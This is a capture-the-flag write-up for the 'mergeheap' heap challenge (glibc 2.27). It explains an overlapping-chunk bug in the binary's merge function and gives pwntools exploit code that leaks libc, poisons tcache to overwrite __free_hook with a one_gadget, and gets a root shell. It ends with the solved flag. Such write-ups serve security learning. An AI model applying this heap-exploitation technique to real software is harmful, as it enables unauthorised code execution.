# 2019 HWB / 强网杯 — mergeheap (BUUCTF) — Writeup

> Pwn / Heap | BUUCTF · `node5.buuoj.cn:28912` | glibc 2.27 (Ubuntu 18.04)

## Challenge Summary

| Field | Value |
|-------|-------|
| Binary | `mergeheap` (10 KB, 64-bit ELF, stripped, PIE) |
| Protections | Full RELRO + Canary + NX + PIE |
| libc | glibc 2.27-3ubuntu1 |
| Menu | `add` / `show` / `dele` / `merge` / `exit` |
| Idx limit | 0–14 (15 slots) |
| Size limit | `0 < size ≤ 0x400` |

## Function Analysis

- **`add`**: finds first free slot, `malloc(size)`, reads content via byte-by-byte loop that **stops on `\n` OR at `size` bytes — does NOT append `\0` when filled to size**
- **`show`**: `puts(ptrs[idx])`
- **`dele`**: `free(ptrs[idx])` + **clears both `ptrs[idx]=0` and `sizes[idx]=0`** → no UAF
- **`merge`** (the vulnerability): `new = malloc(sizes[i1]+sizes[i2])`; `strcpy(new, ptrs[i1])` + `strcat(new, ptrs[i2])`; stores `new` at a **fresh free slot**, **WITHOUT clearing original `ptrs[i1]/ptrs[i2]`** → creates **overlapping chunks**

## Exploit Chain

### Step 1 — Leak libc via unsorted bin residual

Size limit ≤ 0x400 means every chunk ≤ 0x420 → all go to tcache; a single `free` won't reach unsorted bin. Must **fill 7 tcache slots first**, then the 8th `free` falls into unsorted bin.

```python
for _ in range(10):
    add(0x80, b'c'*6 + b'\n')   # idx 0..9
for i in range(9):
    dele(i)                      # 7 → tcache[0x90], 2 → unsorted bin (doubly linked)

add(0x8, b'e'*8)                 # malloc(8) walks unsorted bin, splits 0x20 chunk
show(0)                          # puts: "eeeeeeee" + residual bk = main_arena addr
```

**Offset constant**: `libc_base = leak - 0x3ebdb0` for glibc 2.27-3ubuntu1.

### Step 2 — Tcache poison via merge overlapping

The key: `merge` does NOT clear original pointers. Layout so `merge(1, 2)` produces a chunk physically overlapping `idx 3`'s memory; subsequent `dele(3)` queues that chunk in tcache while the merged pointer can still write its fd field.

```python
add(0x90, b'0'*0x90)                                # idx 0
add(0x98, b'4'*0x98)                                # idx 1
add(0x100, b'5'*(0x100-2) + b'\x10\x02')            # idx 2 (faked size 0x210 at end)
add(0x198, b'6'*0x198)                              # idx 3 (target for overlap)
add(0x60, b'7'*0x60)                                # idx 4
add(0x60, b'a'*0x60)                                # idx 5
for _ in range(7): add(0x60, b'9'*0x60)             # idx 6..12 prefill tcache[0x70]
for i in range(6, 13): dele(i)                       # tcache[0x70] full

pay = b'1'*0x60 + b'\x00'*8 + b'\x71' + b'\x00'*7 + p64(free_hook) + b'\n'
dele(3); merge(1, 2); dele(4)                        # overlap + free chunk into tcache
for _ in range(7): add(0x60, b'8'*0x60)             # drain tcache[0x70]
dele(5); add(0x200, pay)                            # write fd of freed chunk → __free_hook
add(0x60, b'8'*0x60)
add(0x60, p64(one_gadget) + b'\n')                  # 2nd alloc returns __free_hook → write one_gadget
dele(0)                                              # triggers free → __free_hook → one_gadget → shell
```

`one_gadget = libc_base + 0x4f322` (glibc 2.27-3ubuntu1; alternates `0x4f32f` / `0x10a38c` if constraints fail).

## Local Verification

```
$ python3 exp.py
[+] libc_base = 0x7faa68400000
[*] __free_hook = 0x7faa687ed8e8, system = 0x7faa6844f440
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Key Lessons

| Misconception | Reality |
|---------------|---------|
| `dele` doesn't clear ptrs → UAF | Both `ptrs` AND `sizes` cleared; no UAF |
| Could free a single 0x500 chunk to unsorted bin | Size capped at 0x400 → all tcache-eligible; must fill 7 then overflow |
| `merge` overwrites `idx1` or `idx2` | New chunk goes to a fresh free slot; originals retained → that's the vuln |
| `\n` is harmless in add content | Adding `\n` writes `\0`; for overflow you must send exactly `size` bytes |

## Toolchain

- **r2** (`r2 -q -c 'aaa; pdf @ main'`) — static disassembly
- **pwntools** (conda env `pwn`, Python 3.11)
- **patchelf** + `glibc-all-in-one/libs/2.27-3ubuntu1_amd64/` — local glibc 2.27 reproduction

## References

- [Yeuoly/buuctf_pwn/hwb_2019_mergeheap/mergeheap.py](https://github.com/Yeuoly/buuctf_pwn/blob/master/hwb_2019_mergeheap/mergeheap.py)
- [jiancanxuepiao - 护网杯 mergeheap Writeup](https://jiancanxuepiao.github.io/2019/09/14/护网杯-mergeheap-Writeup/)
- [简书 - hwb_2019_mergeheap](https://www.jianshu.com/p/630b1833c8b8)
- [博客园 zhuangzhouQAQ](https://www.cnblogs.com/zhuangzhouQAQ/p/15968717.html)

## Flag

```
flag{b7c8576b-f4fc-4737-b5d1-b66c43a47b0b}
```

One-shot remote pwn via `one_gadget 0x4f322` (no fallback needed). BUUCTF docker static flag.
